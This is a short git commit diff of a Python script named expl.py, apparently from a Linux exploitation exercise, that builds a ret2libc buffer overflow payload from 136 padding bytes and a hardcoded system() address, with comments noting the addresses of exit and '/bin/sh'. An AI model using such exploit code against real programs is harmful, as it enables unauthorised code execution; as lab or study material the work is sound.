3b52657dff3449fa0855fd681431f76cbdf512b4
root <bmedicke@gmail.com>
2022-02-23 18:51:06 +0100

    add next steps

--- Linux Anwendung/expl.py
+++ Linux Anwendung/expl.py
@@ -2,7 +2,11 @@
 
 # 7ffff7e1f860
 system_call = b'\x7f\xff\xf7\xe1\xf8\x60'[::-1]
-payload = b'a'*(136)+system_call
 
+# p exit? 0x7ffff7e15100
+# search-pattern '/bin/sh' x7ffff7f54000
+
+
+payload = b'a'*(136)+system_call
 f = open('payload', 'wb')
 f.write(payload)
